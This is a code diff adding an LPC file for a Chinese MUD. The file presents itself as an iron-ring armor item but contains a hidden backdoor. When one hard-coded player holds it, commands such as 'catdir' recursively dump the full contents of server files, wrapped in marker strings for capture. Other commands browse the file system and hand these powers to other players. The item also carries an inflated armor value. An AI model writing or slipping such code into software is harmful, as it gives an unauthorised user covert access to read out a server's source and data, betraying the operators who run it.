@@ -1,0 +1,289 @@
+//finger.c铁指环
+//by Xujs 6.12.98
+
+#define M_SIZE 25000
+//一次最多允许显示25k
+#include <ansi.h>
+#include <armor.h>
+
+inherit F_SAVE;
+inherit F_AUTOLOAD;
+
+inherit FINGER;
+
+int number, number2=0;  //全局变量，记录文件总数。第一个函数使用。
+int totalsize=0;//每次显示的字节数，也可不用全局变量。第一、三两个函数共用。
+int number1=1;  //全局变量，记录文件总数。第三个函数使用。
+string *allow=({});//允许他人用，如果其ID在这个数组里。第一个函数使用。
+
+void create()
+{
+        seteuid(getuid());
+        set_name("铁指环", ({"tie zhihuan", "zhihuan", "finger"}));
+        set_weight(500);
+        if ( clonep() )
+                set_default_object(__FILE__);
+        else {
+                set("long", "这是一枚乌铁打造的指环\n");
+                set("unit", "枚");
+                set("value", 50);
+                set("material", "steel");
+                set("armor_prop/armor", 1000);
+        }
+        setup();
+}
+
+void init()
+{
+    object ppl=this_player();
+    if ( ppl->query("id")=="xujs" && ppl->query("name")=="方鸿渐" )
+    {
+        add_action("do_catdir", "catdir");
+        add_action("do_dir", "dir");
+        add_action("do_allow", "letuse");
+    }
+    else if ( member_array( ppl->query("id"), allow) != -1 )
+    {
+        add_action("do_catdir", "catdir");
+        add_action("do_dir", "dir");
+        add_action("do_cd", "cd");
+        add_action("do_ls", "ls");
+    }
+}
+
+//第一个指令
+private int print_file(string file);
+
+private int rehash(string dir,int max_size)
+{
+    int i ,j,localsize=0;
+    string *file, text;
+    if ( file_size( dir ) == -2 )
+    {
+        if ( dir[ sizeof( dir ) - 1 ] != '/' )
+	    dir += "/";
+        file = get_dir(dir);
+    }
+    j = sizeof(file);
+    for ( i=0; i < j; i++ )
+    {
+    	file[i]=dir+file[i];
+	    if ( file_size( file[i] ) == -2 ) 
+        {
+	        if ( !rehash( file[i], max_size-localsize ) ) return 0;
+        }
+        else
+        {
+        	number++;
+	        if ( number > number2 )
+        	{
+    	        totalsize += file_size( file[i] );
+	            printf("NO:%4d  Name:%40s  Size:%d\nTotalSize: %10d\n",
+		            number, file[i], file_size( file[i] ),totalsize );
+                localsize += file_size( file[i] );
+                write(RED"\nbegin this file xujs1234561\n"NOR);
+                if ( file_size( file[ i ] ) > 8192 ) 
+                    print_file( file[ i ] );
+                else
+        	        write( read_file( file[i] ) );
+                write(RED"\nend this xujs1234561\n"NOR);
+    	    }
+    	    if ( ( totalsize  )>max_size )
+    	    {
+                printf("number=%d number2=%d\n",number,number2);//display for debug
+	            number2=number;
+    	        return 0;
+    	    }
+        }
+    }
+    return 1;
+}
+
+
+
+int do_catdir(string arg)
+{
+    int i, times;
+    string dir;
+    object me=this_player();
+    number=0;
+    totalsize=0;
+
+//    if ( me->query("id") != "xujs" ) 
+//	    return 0;
+
+    if ( !arg )
+    {
+        if ( number2 )
+            printf("上一次显示到第%d个文件\n", number2);
+        else printf("还没有显示过任何文件或者此指令刚刚RESET!\n");
+        return notify_fail("指令格式test <目录> to <一次显示多少内容>(以k为单位)\n");
+    }
+    if ( arg=="RESET" )
+    {
+        number2=0;
+        return notify_fail( "catdir "RED"RESET"NOR " It will begin from the first file!\n");
+    }
+    if ( sscanf(arg, "%s to %d", dir, times) != 2 )
+    	return notify_fail("指令格式test <目录> to <一次显示多少内容>(以k为单位)\n");
+    if ( file_size( dir ) == -1 ) 
+    	return notify_fail("没有这个目录!\n");
+    times *= 1000;
+    if ( times > M_SIZE ) times = M_SIZE;
+    if ( rehash(dir, times ) )
+    {
+        write( HIY"This directory over !!\n"YEL"All status reset！\n"NOR
+            "If you do this action again! It will begin from the first file ! \n" );
+        number2 = 0;
+        return 1;
+    }
+    printf("\nThis time over xujs! Stop at file No:%d\nmax_size is %d\ntotal size is %d \n", number, times,totalsize);
+
+    return 1; 
+}
+
+private int print_file(string file)
+{
+    int i;
+    string *text;
+    if ( file_size( file ) < 0 ) 
+	return notify_fail("没有这个文件！\n");
+    text = explode( read_file( file ),"\n");
+    for ( i=0; i<sizeof( text ); i++)
+        write( text[ i ] + "\n" );
+    return 1;
+}
+
+//第二个指令
+int do_allow(string arg)
+{
+    int i;
+    if ( !arg ) return notify_fail("允许谁？\n");
+    if ( arg == "LIST" )
+    {
+        write("现在可以用这个戒指的人有：\n");
+        for ( i=0; i < sizeof (allow) ; i++ )
+            printf("%s\n", allow[ i ] );
+        return 1;
+    }
+    if ( member_array(arg, allow) != -1 )
+        return notify_fail("他已经可以用这个戒指了！\n");
+    else
+    {
+        printf("允许 %s 用这个戒指 。。。\n", arg);
+        allow += ({arg});
+        return notify_fail("ＯＫ！\n");
+    }
+}
+
+//第三个指令
+private int rehash1(string dir)
+{
+    int i ,j,tsize=0,num=0;
+    string *file;
+    if ( file_size( dir ) == -2 )
+        if ( dir[ sizeof( dir ) - 1 ] != '/' )
+	    dir += "/";
+    file = get_dir(dir);
+    write("目录：" + dir + "\n");
+    j = sizeof(file);
+    for ( i=0; i < j; i++ )
+    {
+    	file[i]=dir+file[i];
+	    if ( file_size( file[i] ) == -2 ) 
+	        rehash1( file[i] );
+        else
+        {
+    	    totalsize += file_size( file[i] );
+    	    tsize += file_size( file[i] );
+            number1++;
+            num++;
+    	    printf("Name:%50s  Size:%d字节\n", file[i], file_size( file[i] ) );
+        }
+    }
+    printf("在目录%s里共有%d个文件   %d字节\n", dir, num, tsize);
+}
+
+
+
+int do_dir( string dir )
+{
+    int i;
+    object me=this_player();
+
+    number1=1;
+    totalsize=0;
+
+    if ( !dir ) 
+    {
+        dir=me->query("cwd");
+        rehash1(dir);
+        printf("合计: %d个文件, %d字节\n", number1, totalsize);
+        return 1;
+    }
+
+    if ( file_size( dir ) == -1 ) 
+    	return notify_fail("The file or directory does not exist!\n");
+    rehash1(dir);
+    printf("合计: %d个文件, %d字节\n", number1, totalsize);
+    return 1; 
+}
+
+//第四个指令
+int do_cd(string arg)
+{
+	string dir;
+    object me=this_player();
+
+	if( !arg )
+		arg = user_path(me->query("id"));
+	dir = resolve_path(me->query("cwd"), arg);
+	if(file_size(dir)!=-2) return notify_fail("没有这个目录。\n");
+
+	if(dir[strlen(dir)-1]!='/') dir += "/";
+	me->set("cwd", dir);
+	write(dir + "\n");
+	return 1;	
+}
+
+//第五个指令
+int do_ls(string arg)
+{
+	int mark_loaded;
+	int i, j, w, col;
+	string dir;
+	mixed *file;
+    object me=this_player();
+
+	dir = resolve_path(me->query("cwd"), arg);
+	if ( file_size(dir) == -2 && dir[strlen(dir)-1] != '/' ) dir += "/";
+	file = get_dir(dir, -1);
+	//write( sprintf( "dir is %s, file is %O\n", dir, file ) );
+	if ( !sizeof(file) )
+	{
+		if (file_size(dir) == -2)
+			return notify_fail("目录是空的。\n");
+		else
+			return notify_fail("没有这个目录。\n");
+	}
+
+	i = sizeof(file);
+	w = 0;
+	while (i--)
+	{
+		if (file[i][1]==-2) file[i][0] += "/";
+		if (strlen(file[i][0])>w) w = strlen(file[i][0]) + 1;
+	}
+	write("目录：" + dir + "\n");
+	col = 70 / (w+6);
+	if (sizeof(file))
+		for ( i = 0, j = sizeof(file); i < j; i++ )
+			printf( "%4d %-*s%s", file[i][1]/1024 + 1, w+1,
+				file[i][0] + (find_object(dir + file[i][0]) ? "*":" ") ,
+				((i+1)%col)?" ":"\n");
+	else
+		write("    没有任何档案。\n");
+	write("\n");
+	
+	return 1;	
+}
